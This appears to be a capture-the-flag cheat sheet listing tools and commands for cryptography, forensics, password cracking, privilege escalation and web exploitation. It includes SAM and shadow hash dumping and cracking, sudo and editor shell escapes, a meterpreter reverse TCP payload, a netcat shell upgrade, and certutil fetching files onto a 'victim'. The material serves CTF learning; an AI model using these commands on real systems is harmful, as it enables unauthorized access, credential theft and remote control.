## Table of Contents

  - [Getting Started with Linux](#Getting\Started\with\Linux)
  - [Cryptography](#Cryptography)
      - [Additioal Cryptography Information (Wiki's etc.)](#Additioal\Cryptography\Information\(Wiki's\etc.))
  - [Forensics](#Forensics)
      - [Forensics Checklist](#Forensics\Checklist)
    - [Image File](#Image\File)
    - [Binwalk](#Binwalk)
    - [Extract NTFS Filesystem](#Extract\NTFS\Filesystem)
    - [Recover Files from Deleted File Systems](#Recover\Files\from\Deleted\File\Systems)
    - [Packet Capture](#Packet\Capture)
    - [JavaScript Deobfuscator](#JavaScript\Deobfuscator)
  - [Password Cracking](#Password\Cracking)
    - [JOHN the ripper](#JOHN\the\ripper)
    - [SAM Hashes](#SAM\Hashes)
    - [Linux User Hashes](#Linux\User\Hashes)
    - [Hashcat](#Hashcat)
  - [Privilege Escalation](#Privilege\Escalation)
    - [Standard Scripts for Enumeration](#Standard\Scripts\for\Enumeration)
    - [Dirtycow](#Dirtycow)
    - [Sudo](#Sudo)
    - [Gain More Privilige on windows system](#Gain\More\Privilige\on\windows\system)
    - [MYSQL with Sudo Privilage](#MYSQL\with\Sudo\Privilage)
    - [VIM Editor with Sudo Privilage](#VIM\Editor\with\Sudo\Privilage)
    - [Cronjob](#Cronjob)
    - [More or Less Command](#More\or\Less\Command)
    - [Improve Shell](#Improve\Shell)
    - [Transfer Files from Host to Target Machine](#Transfer\Files\from\Host\to\Target\Machine)
  - [Tools](#Tools)
    - [Reconnoitre](#Reconnoitre)
  - [Web Exploitation](#Web\Exploitation)

## Getting Started with Linux
[PHP Primer](https://github.com/trailofbits/ctf/blob/master/web/references/phpprimer_v0.1.pdf)
[Portswigger Academy](https://portswigger.net/burp)
[CTFLearn](https://ctflearn.com)
## Cryptography
_Tools useful for solving Cryptography Challenges_
- [CyberChef](https://gchq.github.io/CyberChef) - Web app for analysing and decoding data.
- [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
- [Hash Extender](https://github.com/iagox86/hash_extender) - A utility tool for performing hash length extension attacks. (Advanced)
- [padding-oracle-attacker](https://github.com/KishanBagaria/padding-oracle-attacker) - A CLI tool to execute padding oracle attacks. (Advanced)
- [PkCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - A tool for Breaking PkZip-encryption.
- [QuipQuip](https://quipqiup.com) - An online tool for breaking substitution ciphers or vigenere ciphers (without key).
- [RSACTFTool](https://github.com/Ganapati/RsaCtfTool) - A tool for recovering RSA private key with various attack.
- [RSATool](https://github.com/ius/rsatool) - Generate private key with knowledge of p and q.
- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.
- [One Time Pad Solver](https://rumkin.com/tools/cipher/one-time-pad/) - One Time Pad Solver
- [Vigenere Solver](https://www.guballa.de/vigenere-solver) - A tool to brute force the Vigenere cipher
#### Additioal Cryptography Information (Wiki's etc.)
- [Linear Congruential Generator(LCG)](https://en.wikipedia.org/wiki/Linear_congruential_generator)
## Forensics
_Tools used for solving Forensics challenges_
- [Aircrack-Ng](http://www.aircrack-ng.org/) - Crack 802.11 WEP and WPA-PSK keys.
    - `apt-get install aircrack-ng`
- [Audacity](http://sourceforge.net/projects/audacity/) - Analyze sound files (mp3, m4a, whatever).
    - `apt-get install audacity`
- [Bkhive and Samdump2](http://sourceforge.net/projects/ophcrack/files/samdump2/) - Dump SYSTEM and SAM files.
    - `apt-get install samdump2 bkhive`
- [CFF Explorer](http://www.ntcore.com/exsuite.php) - PE Editor.
- [Creddump](https://github.com/moyix/creddump) - Dump windows credentials.
- [DVCS Ripper](https://github.com/kost/dvcs-ripper) - Rips web accessible (distributed) version control systems.
- [Exif Tool](http://www.sno.phy.queensu.ca/~phil/exiftool/) - Read, write and edit file metadata.
	- `sudo apt-get install exiftool`
- [Extundelete](http://extundelete.sourceforge.net/) - Used for recovering lost data from mountable images.
- [Fibratus](https://github.com/rabbitstack/fibratus) - Tool for exploration and tracing of the Windows kernel.
- [Foremost](http://foremost.sourceforge.net/) - Extract particular kind of files using headers.
    - `sudo apt-get install foremost`
- [Fsck.ext4](http://linux.die.net/man/8/fsck.ext3) - Used to fix corrupt filesystems.
- [Malzilla](http://malzilla.sourceforge.net/) - Malware hunting tool.
- [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) - Network Forensic Analysis Tool.
- [PDF Streams Inflater](http://malzilla.sourceforge.net/downloads.html) - Find and extract zlib files compressed in PDF files.
- [Pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) - Verifies the integrity of PNG and dump all of the chunk-level information in human-readable form.
    - `sudo apt-get install pngcheck`
- [ResourcesExtract](http://www.nirsoft.net/utils/resources_extract.html) - Extract various filetypes from exes.
- [Shellbags](https://github.com/williballenthin/shellbags) - Investigate NT_USER.dat files.
- [Snow](https://sbmlabs.com/notes/snow_whitespace_steganography_tool) - A Whitespace Steganography Tool.
- [USBRip](https://github.com/snovvcrash/usbrip) - Simple CLI forensics tool for tracking USB device artifacts (history of USB events) on GNU/Linux.
- [Volatility](https://github.com/volatilityfoundation/volatility) - To investigate memory dumps.
- [Wireshark](https://www.wireshark.org) - Used to analyze pcap or pcapng files
_Registry Viewers_
- [OfflineRegistryView](https://www.nirsoft.net/utils/offline_registry_view.html) - Simple tool for Windows that allows you to read offline Registry files from external drive and view the desired Registry key in .reg file format.
- [Registry Viewer®](https://accessdata.com/product-download/registry-viewer-2-0-0) - Used to view Windows registries.
#### Forensics Checklist
### Image File

Try `file` comamnd on the image to learn more information.

**To extract data inside Image files.**
```
> $ zsteg <FILE_NAME>
```

**To check for metadata of the Image files.**
```
> $ exiftool <FILE_NAME>
```

**To search for particular string or flag in an Image file.**
```
> $ strings <FILE_NAME> | grep flag{
```

**To extract data hidden inside an image file protected with password.**
```
> $ steghide extract -sf <FILE_NAME>
```

### Binwalk

**Binwalk helps to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to .zip to find interesting data.**
```
> $ binwalk <IMAGE_NAME>
```

### Extract NTFS Filesystem
```
If there is ntfs file, extract with 7Zip on Windowds. 
If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>`.
Then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
```

**To extract ntfs file system on Linux.**
```
> $ sudo mount -o loop <FILENAME.ntfs> mnt
```

### Recover Files from Deleted File Systems

**To Recover Files from Deleted File Systems from Remote Hosts.**
```
> $ ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz
> $ gunzip -d extract.dd.gz
> $ binwalk -Me extract.dd
```

### Packet Capture

**If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)**
```
> $ tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields
```

### JavaScript Deobfuscator

To Deobfuscate JavaScript, use [Jsnice](http://www.jsnice.org/).

## Password Cracking

### JOHN the ripper

**If there is `JOHN` in the title or text or hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.**
```
> $ john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```
**To crack well known hashes, use [Link](https://hashes.org)**

### SAM Hashes

**To get System User Hashes, we can follow this method.**
```
> $ /mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
> $ /mnt/vhd/Windows/System32/config# cd ~/CTF/
> ~/CTF# ls
  SAM  SYSTEM  
> ~/CTF# mkdir Backup_dump
> ~/CTF# mv SAM SYSTEM Backup_dump/
> ~/CTF# cd Backup_dump/
> ~/CTF/Backup_dump# ls
  SAM  SYSTEM
> ~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
  [*] Cleaning up... 
```

### Linux User Hashes

**If we able to extract /etc/passwd and /etc/shadow file we can use `unshadow`**
```
> $ unshadow <PASSWD> <SHADOW>
```

### Hashcat

**To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace it accordingly.**
```
> $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
```
---
## Privilege Escalation
### Standard Scripts for Enumeration

- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
- [Lin Enum Script](https://github.com/rebootuser/LinEnum)
- [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
- [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.

### Dirtycow

On older linux kernals, we can gain root access using dirtycow exploit.

**To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)**

### Sudo

**To check what sudo command can the current user run with no-password.**
```
> $ sudo -l
```

**Examples:**
```
> $ sudo -l
User www-data may run the following commands on bashed:
(enemy : enemy) NOPASSWD: ALL
```

We can try like below

```
> $ sudo -u enemy /bin/bash
id
uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
```

### Gain More Privilige on windows system

- In meterpreter shell try `getsystem`
- In meterpreter shell try `background` and then follow rest of commands.
- search suggester
    
    ```
    > use post/multi/recon/local_exploit_suggestor
    show options
    set session 1
    run
    ```
    
- If worked fine, else Try follow rest of commands.
- Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
- Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
- If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.

**To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)**

```
> $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
> $ msfconsole -r unicorn.rc 
[*] Started reverse TCP handler on <HOST_IP>:3333 
msf5 exploit(multi/handler) >         
```

### MYSQL with Sudo Privilage

**To get Shell from MYSQL**

```
mysql> \! /bin/sh
```

### VIM Editor with Sudo Privilage

**To get Shell from VIM.**

**Method-1:**

```
> $ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
```

**Method-2:**

```
> $ sudo /usr/bin/vi /var/www/html/anyrandomFile
Type Escape and enter :!/bin/bash
```

### Cronjob

**If some system cron is getting some url present in the file, we can replace url to get flag as below.**

```
> $ cat input 
url = "file:///root/root.txt"
```

**To monitor cronjobs, we can tail the syslogs.**

```
> $ tail -f /var/log/syslog
Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
```

### More or Less Command

- **If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell.**

```
> $ cat new.sh 
#!/bin/bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

```
> $ sh new.sh 
-- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
!/bin/bash
root # 
```

### Improve Shell

**To get the better Shell after taking control of the system.**

```
www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
<html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
www-data@machine:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 443
root@kali:# stty raw -echo
----------------------Here we need to type `fg` and press Enter `Twice`
root@kali:# nc -nlvp 443 
www-data@machine:/var/www/html$ export TERM=xterm
```

### Transfer Files from Host to Target Machine

- Use `python -m SimpleHTTPServer` in the host folder.
- Use Apache and put files in `/var/www/html/` folder.
- If Tomcat is Opened, upload the file/payload using the Admin panel.
- If wordpress is running, upload the file as plugin.
- In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`

## Tools

### Reconnoitre

**Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.**

- [Link](https://github.com/codingo/Reconnoitre)
    
    ```
    > $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
    ```
    
- *Total Commander* - multi purpose terminal for Hacking. Link : www.ghisler.com
- *CTF Exploitation Framework* : GitHub.com/Gallopsled/pwntools `pip install pwntools`
- When using GDB, we can create “`~/.gdbinit`” file and add this line “set disassembly-flavor intel” to make intel synatx.
- *Dirbuster* for enumeration web server Attacks.
- [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
- [Nmap Automator](https://github.com/21y4d/nmapAutomator)
- *7z Password Cracking: Use tool* `7z2john`
- *SSH Password Cracking:* `/usr/share/john/ssh2john.py id_rsa > output.hash`
- [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
- [GDB Peda](https://github.com/longld/peda)
- [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)


## Web Exploitation
_Web Exploitation resources_
- [Our Tangled Web we live in - No Starch Press](https://nostarch.com/download/tangledweb_ch3.pdf)
- [OWASP Top 10 tools and tactics](https://resources.infosecinstitute.com/topics/application-security/owasp-top-10-tools-and-tactics/)










































































































































